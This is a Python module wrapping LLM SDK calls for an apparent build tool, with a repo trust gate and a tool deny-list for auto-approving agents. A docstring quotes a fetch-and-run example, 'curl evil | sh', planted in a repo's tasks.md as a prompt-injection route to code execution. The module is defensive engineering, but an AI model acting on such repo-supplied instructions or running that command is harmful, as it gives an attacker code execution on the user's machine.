"""SDK wrapper for LLM calls — single-turn and multi-turn with file tools.

Three call patterns:
- llm_call(): Single-turn, no tools, returns text. For reviews, rubric scoring, etc.
- agent_call(): Multi-turn with file tools, returns AgentResult. For TDD agents.
- llm_call_structured(): Single-turn, returns Pydantic model. For structured output.

The SDK machinery (isolation flags, hard timeout, stderr capture, big-prompt
tempfile fallback, unknown-message skip) lives in multiplai_core.agent_runner —
this module keeps only what is buildme-specific: the repo trust gate, the
AgentResult mapping (including degrade-to-partial-output on failure), the
concurrency semaphore, structured-output validation, and the LLMCallError
taxonomy.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import time
from typing import TypeVar

from pydantic import BaseModel, ValidationError

from multiplai_core.agent_runner import (
    MAX_PROMPT_BYTES,  # noqa: F401 — re-exported (E2BIG threshold lives in core now)
    AgentRunError,
    AgentRunTimeout,
    run_agent,
)
from multiplai_core.aio import hard_timeout, swallow_task_result as _swallow_task_result  # noqa: F401
from multiplai_core.text import extract_json  # noqa: F401

from . import budget
from .models import AgentResult

log = logging.getLogger(__name__)

T = TypeVar("T", bound=BaseModel)

DEFAULT_LLM_CALL_TIMEOUT_S = 600.0
DEFAULT_AGENT_CALL_TIMEOUT_S = 1800.0  # 30 min for implementation agents
MAX_CONCURRENT_SDK_CALLS = 10

_sdk_semaphore: asyncio.Semaphore | None = None


def _get_semaphore() -> asyncio.Semaphore:
    global _sdk_semaphore
    if _sdk_semaphore is None:
        _sdk_semaphore = asyncio.Semaphore(MAX_CONCURRENT_SDK_CALLS)
    return _sdk_semaphore


def _require_sdk() -> None:
    """Fail with the buildme error taxonomy when the SDK is absent."""
    try:
        import claude_agent_sdk  # noqa: F401
    except ImportError as e:
        raise LLMCallError("claude-agent-sdk not installed") from e


class LLMCallError(Exception):
    """Raised when an LLM call fails beyond retry."""


class LLMCallTimeoutError(LLMCallError):
    """Raised when an LLM call exceeds its timeout."""


class RepoTrustError(LLMCallError):
    """Raised when an agent would run tools in bypassPermissions mode against a
    repository the user has not explicitly marked as trusted."""


def _repo_is_trusted() -> bool:
    """Whether the user has opted into running unattended, auto-approving agents
    against the target repo.

    buildme's implementation/refactor/apply agents run with
    permission_mode="bypassPermissions" and their prompts are assembled from the
    repo's own specs/ (design.md, tasks.md, config.yaml). Pointed at a hostile
    repo, a `tasks.md` that says "first run `curl evil | sh`" becomes code
    execution as the user (CWE-94). We therefore require an explicit opt-in —
    the `--trust-repo` flag or BUILDME_TRUST_REPO=1 — before any such agent runs.
    """
    return os.environ.get("BUILDME_TRUST_REPO", "").strip().lower() in ("1", "true", "yes")


# The tool universe a call's deny-list is computed from. run_agent's
# allow-list is advisory under bypassPermissions; only disallowed_tools
# actually removes a tool — so every call denies the complement of what it
# explicitly allows (a text-only call denies all of it).
#
# Copied rather than imported from multiplai-core, for the same reason
# deep-research copies it: this is the belt-and-braces layer, and it has to hold
# on an installed plugin that resolved a core release predating core's own
# fail-closed default. Current core (`agent_runner.TOOL_UNIVERSE`) pairs its
# copy with the SDK's `tools` option — the CLI's `--tools`, which sets the
# *base set* of tools that exist at all rather than adding to the built-in set.
# `tools=[]` is "no tools" with no list to keep current, and that is the real
# guarantee; this list is the second layer under it.
#
# Best-effort enumeration, not a safety floor. Adding a name tightens the
# second layer; a name missing from it is a tool the base set still has to
# close. Derived 2026-08-06 from the CLI's own generated schema list
# (`@anthropic-ai/claude-code/sdk-tools.d.ts`) plus the harness-only names that
# file does not carry (Skill, ToolSearch, SlashCommand, BashOutput, KillShell,
# Task). Re-derive it on a CLI bump:
#
#   grep -oE '^export (type|interface) [A-Za-z]+Input' \
#     "$(dirname "$(readlink -f "$(command -v claude)")")/../sdk-tools.d.ts" \
#     | sed 's/.* //;s/Input$//' | sort -u
#
# (That file names schemas, not tools, so FileRead/FileEdit/FileWrite appear
# there as the schemas behind Read/Edit/Write.)
_TOOL_UNIVERSE = [
    # mutation / execution
    "Bash", "BashOutput", "KillShell", "Edit", "Write", "NotebookEdit",
    "MultiEdit", "REPL", "Task", "Agent", "AskUserQuestion", "SlashCommand",
    "ExitPlanMode", "EnterPlanMode", "TodoWrite",
    # read / network / meta
    "Read", "NotebookRead", "Grep", "Glob", "LS", "WebFetch", "WebSearch",
    "ToolSearch", "Skill",
    # egress: each can carry text off the machine. buildme's prompts are
    # assembled from the target repo's own specs/, so they are as
    # attacker-authored as a fetched page the moment the repo is not the
    # user's own — which is exactly what the trust gate above is about.
    "Artifact", "SendMessage", "PushNotification", "RemoteTrigger",
    "SendFeedback",
    # background / scheduled execution — a denied Bash is worth little if the
    # run can queue work that gets one later
    "TaskCreate", "TaskGet", "TaskList", "TaskUpdate", "TaskStop",
    "TaskOutput", "Workflow", "ScheduleWakeup", "Monitor",
    "CronCreate", "CronDelete", "CronList",
    # MCP: separately contained by core's strict-mcp-config + setting_sources=[],
    # listed so this layer does not depend on that one
    "Mcp", "ListMcpResources", "ReadMcpResource", "ReadMcpResourceDir",
    "RefreshMcpTools",
    # remaining harness surface
    "EnterWorktree", "ExitWorktree", "ReportFindings", "ProposeSkills",
    "Projects", "ClaudeDesign", "ShowOnboardingRolePicker",
]


def _deny_list(prompt: str, allowed_tools: list[str] | None) -> list[str]:
    """Every known tool the caller did not explicitly allow.

    Without this, an allowlisted agent (e.g. the web-ingesting explainer with
    Read/WebFetch allowed) can still reach Bash/Write under bypassPermissions —
    the allow-list alone removes nothing. Read is kept available when
    run_agent's oversized-prompt fallback will need it (it writes the prompt
    to a temp file and directs the agent to Read it)."""
    allowed = set(allowed_tools or ())
    denied = [t for t in _TOOL_UNIVERSE if t not in allowed]
    if len(prompt.encode("utf-8")) > MAX_PROMPT_BYTES:
        denied = [t for t in denied if t != "Read"]
    return denied


def _require_trusted_repo() -> None:
    """Fail closed: any bypassPermissions agent with tool access acts on
    instructions drawn from the target repo's specs/. Refuse unless the user
    has explicitly vouched for the repo."""
    if not _repo_is_trusted():
        raise RepoTrustError(
            "buildme runs its tool-using agents with auto-approved tool access "
            "(bypassPermissions), executing steps described in this repo's specs/ "
            "(design.md, tasks.md, config.yaml). Only proceed on a repository you "
            "trust — a hostile repo can turn those files into arbitrary command "
            "execution as you.\n"
            "If you authored / trust this repo, re-run with --trust-repo "
            "(or set BUILDME_TRUST_REPO=1)."
        )


def _record_partial(error: AgentRunError, label: str) -> None:
    """Charge the budget for tokens a *failed* call already burned.

    The runaway spend this ledger guards against is made of exactly these:
    a review that times out after a 150k-char prompt cost real money and
    would otherwise be invisible. `budget.record()` never raises, so this is
    safe on an error path.
    """
    partial = getattr(error, "partial", None)
    if partial is not None:
        budget.record(partial.usage, label=label)


async def llm_call(
    prompt: str,
    *,
    model: str | None = None,
    effort: str | None = None,
    max_turns: int = 1,
    system_prompt: str | None = None,
    allowed_tools: list[str] | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
    budget_label: str = "",
) -> str:
    """Single-turn LLM call. Returns text response. No tools by default.

    When no tools are requested the call must also *disallow* them: an
    allow-list is advisory under bypassPermissions, so the model can still
    reach for Bash/Read, burn the single turn on a tool call, and fail the
    whole call with "Reached maximum number of turns (1)" instead of
    answering. All the context these calls need is already in the prompt.

    A call that *does* request tools is an agent in all but name — it runs
    under bypassPermissions like agent_call — so it is subject to the same
    repo trust gate and gets the complement of its allow-list as a deny-list.
    """
    _require_sdk()
    if allowed_tools:
        _require_trusted_repo()

    log.info("START sdk_call=llm prompt_bytes=%d model=%s timeout=%.0fs",
             len(prompt.encode("utf-8")), model or "default", call_timeout)
    async with _get_semaphore():
        try:
            result = await run_agent(
                prompt,
                system_prompt=system_prompt,
                allowed_tools=allowed_tools,
                disallowed_tools=_deny_list(prompt, allowed_tools),
                max_turns=max_turns,
                model=model,
                effort=effort,
                timeout_s=call_timeout,
                label="llm",
                component="buildme",
            )
        except AgentRunTimeout as e:
            # A call that dies after burning a 150k-char review prompt is
            # exactly the spend the budget exists to catch, so account for the
            # partial usage before propagating (same rule as `agent_call`).
            _record_partial(e, budget_label or "llm")
            log.error("FAIL sdk_call=llm reason=timeout after %.0fs\n--- CLI stderr ---\n%s",
                      call_timeout, e.stderr_tail)
            raise LLMCallTimeoutError(
                f"LLM call exceeded {call_timeout:.0f}s timeout"
            ) from e
        except AgentRunError as e:
            _record_partial(e, budget_label or "llm")
            log.error("FAIL sdk_call=llm error=%s\n--- CLI stderr ---\n%s",
                      e.reason, e.stderr_tail)
            raise LLMCallError(
                f"SDK query failed: {e.reason}\n--- CLI stderr ---\n{e.stderr_tail}"
            ) from e

    budget.record(result.usage, label=budget_label or "llm")
    log.info("DONE sdk_call=llm result_chars=%d", len(result.text))
    return result.text


async def agent_call(
    prompt: str,
    *,
    allowed_tools: list[str],
    model: str | None = None,
    effort: str | None = None,
    max_turns: int = 50,
    cwd: str | None = None,
    call_timeout: float = DEFAULT_AGENT_CALL_TIMEOUT_S,
    budget_label: str = "",
) -> AgentResult:
    """Multi-turn agent call with file tools. For TDD agents.

    The agent can read/write files, run commands, and iterate until done.
    Returns AgentResult with success status, output, and file changes.
    """
    _require_sdk()

    _require_trusted_repo()

    log.info("START sdk_call=agent tools=%s model=%s max_turns=%d timeout=%.0fs",
             allowed_tools, model or "default", max_turns, call_timeout)
    start = time.monotonic()

    async with _get_semaphore():
        try:
            result = await run_agent(
                prompt,
                allowed_tools=allowed_tools,
                disallowed_tools=_deny_list(prompt, allowed_tools),
                max_turns=max_turns,
                model=model,
                effort=effort,
                cwd=cwd,  # None → run_agent's isolated hook-sessions dir
                timeout_s=call_timeout,
                label="agent",
                component="buildme",
            )
        except AgentRunError as e:
            # Degrade to partial output instead of raising — the TDD engine
            # decides whether a failed agent aborts the block or retries.
            elapsed = time.monotonic() - start
            partial = e.partial
            timed_out = isinstance(e, AgentRunTimeout)
            # A failed agent still burned tokens up to the failure point.
            _record_partial(e, budget_label or "agent")
            log.error("FAIL sdk_call=agent reason=%s elapsed=%.0fs turns=%d\n--- CLI stderr ---\n%s",
                      "timeout" if timed_out else e.reason, elapsed,
                      partial.turns if partial else 0, e.stderr_tail)
            error_msg = (
                f"Agent timed out after {elapsed:.0f}s\nCLI stderr:\n{e.stderr_tail}"
                if timed_out
                else f"{e.reason}\nCLI stderr:\n{e.stderr_tail}"
            )
            return AgentResult(
                success=False,
                output=partial.text if partial else "",
                error=error_msg,
                timed_out=timed_out,
                turns_used=partial.turns if partial else 0,
                elapsed_seconds=elapsed,
                files_changed=partial.files_changed if partial else [],
            )

    elapsed = time.monotonic() - start
    budget.record(result.usage, label=budget_label or "agent")
    log.info("DONE sdk_call=agent turns=%d elapsed=%.0fs files_changed=%d",
             result.turns, elapsed, len(result.files_changed))
    return AgentResult(
        success=True,
        output=result.text,
        turns_used=result.turns,
        elapsed_seconds=elapsed,
        files_changed=result.files_changed,
    )


async def llm_call_structured(
    prompt: str,
    schema: type[T],
    *,
    model: str | None = None,
    effort: str | None = None,
    max_retries: int = 1,
    system_prompt: str | None = None,
    call_timeout: float = DEFAULT_LLM_CALL_TIMEOUT_S,
    budget_label: str = "",
) -> T:
    """LLM call with Pydantic-validated structured output."""
    current_prompt = prompt
    last_error: Exception | None = None

    for attempt in range(max_retries + 1):
        raw = await llm_call(current_prompt, model=model, effort=effort,
                             system_prompt=system_prompt, call_timeout=call_timeout,
                             budget_label=budget_label)
        try:
            payload = extract_json(raw)
            return schema.model_validate(payload)
        except (ValidationError, ValueError, json.JSONDecodeError) as e:
            last_error = e
            log.warning("Structured output validation failed (attempt %d/%d): %s", attempt + 1, max_retries + 1, e)
            if attempt < max_retries:
                current_prompt = (
                    f"{prompt}\n\n---\n"
                    f"Previous response failed validation: {e}\n"
                    f"Return ONLY valid JSON matching this schema:\n"
                    f"{json.dumps(schema.model_json_schema(), indent=2)}\n"
                )

    raise LLMCallError(f"Structured output validation failed after {max_retries + 1} attempts: {last_error}")
